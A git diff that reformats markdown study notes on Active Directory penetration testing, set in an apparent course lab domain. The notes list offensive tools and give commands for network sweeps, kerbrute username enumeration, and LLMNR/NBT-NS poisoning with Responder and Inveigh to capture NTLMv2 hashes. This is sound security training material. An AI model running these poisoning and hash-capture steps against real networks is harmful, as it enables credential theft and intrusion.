@@ -1,155 +1,154 @@
-# ACTIVE DIRECTORY Enum & Attacks
+# Active Directory Enumeration and Attacks
 
-[https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
+## ACTIVE DIRECTORY Enum & Attacks
+
+[https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg)
 
 AD method
 
-### **In Scope For Assessment**
+#### **In Scope For Assessment**
 
-| Range/Domain | Description |
-| --- | --- |
-| INLANEFREIGHT.LOCAL | Customer domain to include AD and web services. |
-| LOGISTICS.INLANEFREIGHT.LOCAL | Customer subdomain |
-| FREIGHTLOGISTICS.LOCAL | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
-| 172.16.5.0/23 | In-scope internal subnet. |
+| Range/Domain                  | Description                                                                               |
+| ----------------------------- | ----------------------------------------------------------------------------------------- |
+| INLANEFREIGHT.LOCAL           | Customer domain to include AD and web services.                                           |
+| LOGISTICS.INLANEFREIGHT.LOCAL | Customer subdomain                                                                        |
+| FREIGHTLOGISTICS.LOCAL        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
+| 172.16.5.0/23                 | In-scope internal subnet.                                                                 |
 
-# **Tools of the Trade**
+## **Tools of the Trade**
 
-| Tool | Description |
-| --- | --- |
-| https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1/https://github.com/dmchell/SharpView | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
-| https://github.com/BloodHoundAD/BloodHound | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a https://neo4j.com/ database for graphical analysis of the AD environment. |
-| https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis. |
-| https://github.com/fox-it/BloodHound.py | A Python-based BloodHound ingestor based on the https://github.com/CoreSecurity/impacket/. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis. |
-| https://github.com/ropnop/kerbrute | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing. |
-| https://github.com/SecureAuthCorp/impacket | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory. |
-| https://github.com/lgandx/Responder | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
-| https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1 | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |
-| https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes. |
-| https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges. |
-| https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service. |
-| https://github.com/byt3bl33d3r/CrackMapExec | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL. |
-| https://github.com/GhostPack/Rubeus | Rubeus is a C# tool built for Kerberos Abuse. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py | Another Impacket module geared towards finding Service Principal names tied to normal users. |
-| https://hashcat.net/hashcat/ | A great hash cracking and password recovery tool. |
-| https://github.com/CiscoCXSecurity/enum4linux | A tool for enumerating information from Windows and Samba systems. |
-| https://github.com/cddmp/enum4linux-ng | A rework of the original Enum4linux tool that works a bit differently. |
-| https://linux.die.net/man/1/ldapsearch | Built-in interface for interacting with the LDAP protocol. |
-| https://github.com/ropnop/windapsearch | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |
-| https://github.com/dafthack/DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |
-| https://github.com/leoloobeek/LAPSToolkit | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). |
-| https://github.com/ShawnDEvans/smbmap | SMB share enumeration across a domain. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py | Part of the Impacket toolkit, it provides the capability of command execution over WMI. |
-| https://github.com/SnaffCon/Snaffler | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |
-| https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |
-| https://github.com/ParrotSec/mimikatz | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py | Remotely dump SAM and LSA secrets from a host. |
-| https://github.com/Hackplayers/evil-winrm | Provides us with an interactive shell on a host over the WinRM protocol. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. |
-| https://github.com/Ridter/noPac | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py | Part of the Impacket toolset, RPC endpoint mapper. |
-| https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py | Printnightmare PoC in python. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py | Part of the Impacket toolset, it performs SMB relay attacks. |
-| https://github.com/topotam/PetitPotam | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |
-| https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py | Tool for manipulating certificates and TGTs. |
-| https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py | This tool will use an existing TGT to request a PAC for the current user using U2U. |
-| https://github.com/dirkjanm/adidnsdump | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. |
-| https://github.com/t0thkr1s/gpp-decrypt | Extracts usernames and passwords from Group Policy preferences files. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py | SID bruteforcing tool. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc. |
-| https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. |
-| https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions. |
-| https://www.pingcastle.com/documentation/ | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration adapted to AD security). |
-| https://github.com/Group3r/Group3r | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). |
-| https://github.com/adrecon/ADRecon | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state. |
+| Tool                                                                                                                | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+| ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1/https://github.com/dmchell/SharpView | A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net\* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting. |
+| https://github.com/BloodHoundAD/BloodHound                                                                          | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a https://neo4j.com/ database for graphical analysis of the AD environment.                                                                                                                                                                                                                   |
+| https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors                                                   | The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.                                                                                                                                                                                                                                                                                                      |
+| https://github.com/fox-it/BloodHound.py                                                                             | A Python-based BloodHound ingestor based on the https://github.com/CoreSecurity/impacket/. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.                                                                                                                                                                                                                                                                                                                                         |
+| https://github.com/ropnop/kerbrute                                                                                  | A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| https://github.com/SecureAuthCorp/impacket                                                                          | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.                                                                                                                                                                                                                                                                                                                                                                                                                             |
+| https://github.com/lgandx/Responder                                                                                 | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1                                                  | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh                                                      | The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+| https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo                            | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.                                                                                                                                                            |
+| https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html                                                  | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.                                                                                                                                                                                                                                                                                                                                                                                                                                                |
+| https://github.com/byt3bl33d3r/CrackMapExec                                                                         | CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.                                                                                                                                                                                                                                                                                                                                 |
+| https://github.com/GhostPack/Rubeus                                                                                 | Rubeus is a C# tool built for Kerberos Abuse.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py                                      | Another Impacket module geared towards finding Service Principal names tied to normal users.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| https://hashcat.net/hashcat/                                                                                        | A great hash cracking and password recovery tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| https://github.com/CiscoCXSecurity/enum4linux                                                                       | A tool for enumerating information from Windows and Samba systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+| https://github.com/cddmp/enum4linux-ng                                                                              | A rework of the original Enum4linux tool that works a bit differently.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| https://linux.die.net/man/1/ldapsearch                                                                              | Built-in interface for interacting with the LDAP protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| https://github.com/ropnop/windapsearch                                                                              | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
+| https://github.com/dafthack/DomainPasswordSpray                                                                     | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| https://github.com/leoloobeek/LAPSToolkit                                                                           | The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).                                                                                                                                                                                                                                                                                                                                                                                             |
+| https://github.com/ShawnDEvans/smbmap                                                                               | SMB share enumeration across a domain.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py                                           | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py                                          | Part of the Impacket toolkit, it provides the capability of command execution over WMI.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| https://github.com/SnaffCon/Snaffler                                                                                | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py                                        | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
+| https://github.com/ParrotSec/mimikatz                                                                               | Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py                                      | Remotely dump SAM and LSA secrets from a host.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
+| https://github.com/Hackplayers/evil-winrm                                                                           | Provides us with an interactive shell on a host over the WinRM protocol.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py                                      | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| https://github.com/Ridter/noPac                                                                                     | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py                                          | Part of the Impacket toolset, RPC endpoint mapper.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
+| https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py                                                 | Printnightmare PoC in python.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py                                       | Part of the Impacket toolset, it performs SMB relay attacks.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| https://github.com/topotam/PetitPotam                                                                               | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
+| https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py                                                 | Tool for manipulating certificates and TGTs.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py                                                    | This tool will use an existing TGT to request a PAC for the current user using U2U.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| https://github.com/dirkjanm/adidnsdump                                                                              | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
+| https://github.com/t0thkr1s/gpp-decrypt                                                                             | Extracts usernames and passwords from Group Policy preferences files.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py                                       | Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.                                                                                                                                                                                                                                                                                                                            |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py                                        | SID bruteforcing tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py                                         | A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
+| https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py                                       | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer                                                  | Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.                                                                                                                                                  |
+| https://www.pingcastle.com/documentation/                                                                           | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on https://en.wikipedia.org/wiki/Capability\_Maturity\_Model\_Integration adapted to AD security).                                                                                                                                                                                                                                                                                                                                                                                   |
+| https://github.com/Group3r/Group3r                                                                                  | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| https://github.com/adrecon/ADRecon                                                                                  | A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.                                                                                                                                                                                                                                                                                                                                                             |
 
-# **Initial Enumeration**
+## **Initial Enumeration**
 
-## **External Recon and Enumeration Principles**
+### **External Recon and Enumeration Principles**
 
-- [https://bgp.he.net/](https://bgp.he.net/) for **Finding Address Spaces**
-- [https://whois.domaintools.com/](https://whois.domaintools.com/)
-- [https://viewdns.info/](https://viewdns.info/)
+* [https://bgp.he.net/](https://bgp.he.net/) for **Finding Address Spaces**
+* [https://whois.domaintools.com/](https://whois.domaintools.com/)
+* [https://viewdns.info/](https://viewdns.info/)
 
-## **Initial Enumeration of the Domain**
+### **Initial Enumeration of the Domain**
 
-- Running wireshark or tcp dump to see what hosts and types of network traffic we can capture. we can look for `arp` and `mdns` or other layer 2 packets.
-- Then using Responder tool to analyze network traffic and determine if anything else in the domain pops up. `sudo responder -I ens224 -A`
-- [https://fping.org/](https://fping.org/) ICMP sweep of the subnet using `fping`.
+* Running wireshark or tcp dump to see what hosts and types of network traffic we can capture. we can look for `arp` and `mdns` or other layer 2 packets.
+* Then using Responder tool to analyze network traffic and determine if anything else in the domain pops up. `sudo responder -I ens224 -A`
+* [https://fping.org/](https://fping.org/) ICMP sweep of the subnet using `fping`.
 
-| Command | Description |
-| --- | --- |
-| nslookup ns1.inlanefreight.com | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
-| sudo tcpdump -i ens224 | Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host. |
-| sudo responder -I ens224 -A | Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host |
-| fping -asgq 172.16.5.0/23 | Performs a ping sweep on the specified network segment from a Linux-based host. |
-| sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host |
-| sudo git clone https://github.com/ropnop/kerbrute.git | Uses git to clone the kerbrute tool from a Linux-based host. |
-| make help | Used to list compiling options that are possible with make from a Linux-based host. |
-| sudo make all | Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures. |
-| ./kerbrute_linux_amd64 | Used to test the chosen complied Kebrute binary from a Linux-based host. |
-| sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute | Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
-| ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results | Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host. |
+| Command                                                                                             | Description                                                                                                                                                                                                                                                                                         |
+| --------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| nslookup ns1.inlanefreight.com                                                                      | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.                                                                                                                                                              |
+| sudo tcpdump -i ens224                                                                              | Used to start capturing network packets on the network interface proceeding the -i option a Linux-based host.                                                                                                                                                                                       |
+| sudo responder -I ens224 -A                                                                         | Used to start responding to & analyzing LLMNR, NBT-NS and MDNS queries on the interface specified proceeding the -I option and operating in Passive Analysis mode which is activated using -A. Performed from a Linux-based host                                                                    |
+| fping -asgq 172.16.5.0/23                                                                           | Performs a ping sweep on the specified network segment from a Linux-based host.                                                                                                                                                                                                                     |
+| sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum                                    | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (-A) based on a list of hosts (hosts.txt) specified in the file proceeding -iL. Then outputs the scan results to the file specified after the -oNoption. Performed from a Linux-based host |
+| sudo git clone https://github.com/ropnop/kerbrute.git                                               | Uses git to clone the kerbrute tool from a Linux-based host.                                                                                                                                                                                                                                        |
+| make help                                                                                           | Used to list compiling options that are possible with make from a Linux-based host.                                                                                                                                                                                                                 |
+| sudo make all                                                                                       | Used to compile a Kerbrute binary for multiple OS platforms and CPU architectures.                                                                                                                                                                                                                  |
+| ./kerbrute\_linux\_amd64                                                                            | Used to test the chosen complied Kebrute binary from a Linux-based host.                                                                                                                                                                                                                            |
+| sudo mv kerbrute\_linux\_amd64 /usr/local/bin/kerbrute                                              | Used to move the Kerbrute binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool.                                                                                                                                                                          |
+| ./kerbrute\_linux\_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results | Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.             |
 
-# **Sniffing out a Foothold**
+## **Sniffing out a Foothold**
 
-## LLMNR/NBT-NS Poisoning From Linux
+### LLMNR/NBT-NS Poisoning From Linux
 
-`LLMNR` is a protocol used to identify hosts when DNS fails to do so. Previously known as `NBT-NS` 
+`LLMNR` is a protocol used to identify hosts when DNS fails to do so. Previously known as `NBT-NS`
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled.png>)
 
-in last step when victim connects to us it sends us its `username` and `NTLM` hash. Which we will  intercept using responder.
+in last step when victim connects to us it sends us its `username` and `NTLM` hash. Which we will intercept using responder.
 
 In short
 
-1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
+1. A host attempts to connect to the print server at \print01.inlanefreight.local, but accidentally types in \printer01.inlanefreight.local.
 2. The DNS server responds, stating that this host is unknown.
-3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
-4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
+3. The host then broadcasts out to the entire local network asking if anyone knows the location of \printer01.inlanefreight.local.
+4. The attacker (us with `Responder` running) responds to the host stating that it is the \printer01.inlanefreight.local that the host is looking for.
 5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
 6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.
 
 RUN RESPONDER
 
-- `sudo responder -I {interface}` → run responder
-    
-    ![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%201.png)
-    
+*   `sudo responder -I {interface}` → run responder
+
+    ![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 1.png>)
+
     Responder will capture hash
-    
+
     copy the whole hash and crack the hash if possible.
-    
-    # In windows we will use [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
-    
-    If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#.
-    
-- `PS C:\htb> Import-Module .\Inveigh.ps1` → importing module.
-- `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` → starting inveigh with llmnr and NBNS spoofing and output to the console and write to a file.
-    
-    ## **`C# Inveigh (InveighZero)`**
-    
+
+    ## In windows we will use [Inveigh](https://github.com/Kevin-Robertson/Inveigh)
+
+    If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#.
+* `PS C:\htb> Import-Module .\Inveigh.ps1` → importing module.
+*   `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` → starting inveigh with llmnr and NBNS spoofing and output to the console and write to a file.
+
+    ### **`C# Inveigh (InveighZero)`**
+
     Powershell version is no longer updated, C# version is maintained update by the authors.
-    
-- `PS C:\htb> .\Inveigh.exe` → run the c# version, which will start capturing the hash.
-    
-    We can hit the `esc` key to enter the console while Inveigh is running.
-    
-    After typing `HELP` and hitting enter, we are presented with several options:
-    
-    We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
-    
-    We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.
-    
+*   `PS C:\htb> .\Inveigh.exe` → run the c# version, which will start capturing the hash.
 
-# **Sighting In, Hunting For A User**
+    We can hit the `esc` key to enter the console while Inveigh is running.
 
-## **Enumerating & Retrieving Password Policies**
+    After typing `HELP` and hitting enter, we are presented with several options:
 
-## **Enumerating & Retrieving - from Linux - Credentialed ⭐**
+    We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
+
+    We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected.
+
+## **Sighting In, Hunting For A User**
+
+### **Enumerating & Retrieving Password Policies**
+
+### **Enumerating & Retrieving - from Linux - Credentialed ⭐**
 
 With valid domain credentials, password policy can be obtained remotely using tools like `crackmapexec` or `rpcclient`
 
@@ -173,37 +172,37 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password No Anon Cha
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  	Domain Password Complex: 1
 ```
 
